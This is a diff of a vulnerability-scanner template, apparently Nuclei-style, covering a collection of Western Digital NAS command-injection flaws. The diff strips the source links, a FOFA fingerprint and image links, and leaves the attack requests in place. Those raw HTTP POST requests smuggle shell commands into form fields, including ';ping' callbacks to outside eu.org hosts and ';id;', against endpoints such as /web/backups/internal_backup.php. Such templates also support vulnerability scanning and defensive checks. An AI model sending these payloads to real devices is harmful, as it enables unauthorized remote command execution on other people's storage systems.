@@ -3,12 +3,8 @@ info:
   name: 西部数据命令执行漏洞合集
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vt4yxviv4z3vgsi7'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vt4yxviv4z3vgsi7
-    fofa: icon_hash="-1074357885"
 http:
 - raw:
   - 'POST /web/backups/internal_backup.php HTTP/1.1
@@ -28,9 +24,7 @@ http:
     Content-Length: 8
 
 
-    action=go_jobs&taskname='';ping fycuookhjw.lfcx.eu.org;''
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013934383-50f138dc-d725-41d8-b710-e62970077241.png)'
+    action=go_jobs&taskname='';ping fycuookhjw.lfcx.eu.org;'''
   redirects: false
   matchers:
   - status:
@@ -54,9 +48,7 @@ http:
     Content-Length: 8
 
 
-    action=save&enable_auto_clear=";ping laiwzagzrg.lfcx.eu.org;"&clear_days=1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013934635-7473d1f7-a1b0-40e2-9dc5-c4ef433f3a1f.png)'
+    action=save&enable_auto_clear=";ping laiwzagzrg.lfcx.eu.org;"&clear_days=1'
   redirects: false
   matchers:
   - status:
@@ -80,9 +72,7 @@ http:
     Content-Length: 8
 
 
-    cmd=set&opt=;id;&arg=1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013934887-105aa836-e571-440a-9050-9bb28d441fba.png)'
+    cmd=set&opt=;id;&arg=1'
   redirects: false
   matchers:
   - status:
@@ -106,9 +96,7 @@ http:
     Content-Length: 30
 
 
-    cmd=setSataPower&enable=";ping zhxoimzfrw.yutu.eu.org;"
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013935298-4d296181-5b76-4493-8185-edbe2877a29f.png)'
+    cmd=setSataPower&enable=";ping zhxoimzfrw.yutu.eu.org;"'
   redirects: false
   matchers:
   - status:
